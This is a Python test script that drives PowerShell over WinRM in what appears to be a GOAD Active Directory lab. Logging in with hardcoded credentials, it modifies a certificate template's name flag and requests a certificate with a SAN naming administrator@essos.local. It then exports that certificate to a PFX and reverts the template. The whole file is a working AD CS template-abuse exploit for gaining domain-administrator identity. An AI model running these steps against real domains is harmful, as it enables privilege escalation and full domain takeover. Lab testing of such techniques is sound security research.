#!/usr/bin/env python3
"""
test_asn1_flow.py — Test ASN.1 SAN Concealed Certificate Generation as khal.drogo
"""
import sys
import time
sys.path.insert(0, '/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm

s_dc = winrm.Session('http://127.0.0.1:55985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv = winrm.Session('http://127.0.0.1:56985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

print("[1] Mutating template flag to 1 on DC03 as khal.drogo...")
ps_mut = """
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
"""
s_dc.run_ps(ps_mut)

print("[2] Creating INF and generating CSR on SRV03 as khal.drogo...")
ps_inf = """
$inf = @"
[NewRequest]
Subject = "CN=khal.drogo"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\concealed.inf", $inf)
$p1 = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\concealed.inf C:\\Shared\\concealed.req" -Wait -PassThru -NoNewWindow
Write-Output ("CSR ExitCode: " + $p1.ExitCode)
"""
r1 = s_srv.run_ps(ps_inf)
print(r1.std_out.decode('utf-8', errors='ignore'))

print("[3] Submitting CSR on SRV03 as khal.drogo...")
ps_sub = """
$p2 = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\concealed.req C:\\Shared\\concealed.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p2.ExitCode)
"""
r2 = s_srv.run_ps(ps_sub)
print(r2.std_out.decode('utf-8', errors='ignore'))

print("[4] Accepting cert into store and exporting to PFX...")
ps_acc = """
$p3 = Start-Process -FilePath "certreq.exe" -ArgumentList "-accept -user -q C:\\Shared\\concealed.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Accept ExitCode: " + $p3.ExitCode)

# Find certificate and export to PFX
$cert = Get-ChildItem Cert:\\CurrentUser\\My | Sort-Object NotBefore -Descending | Select-Object -First 1
Write-Output ("Exporting Cert: " + $cert.Thumbprint + " Subject: " + $cert.Subject + " Serial: " + $cert.SerialNumber)
$pwd = ConvertTo-SecureString -String "pass" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath "C:\\Shared\\concealed_admin.pfx" -Password $pwd | Out-Null
Write-Output ("PFX Exists: " + (Test-Path "C:\\Shared\\concealed_admin.pfx"))
"""
r3 = s_srv.run_ps(ps_acc)
print(r3.std_out.decode('utf-8', errors='ignore'))

print("[5] Reverting template flag to 33554432 on DC03 as khal.drogo...")
ps_rev = """
$nc = (Get-ADRootDSE).configurationNamingContext
$p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
"""
s_dc.run_ps(ps_rev)
print("[+] Test flow complete.")
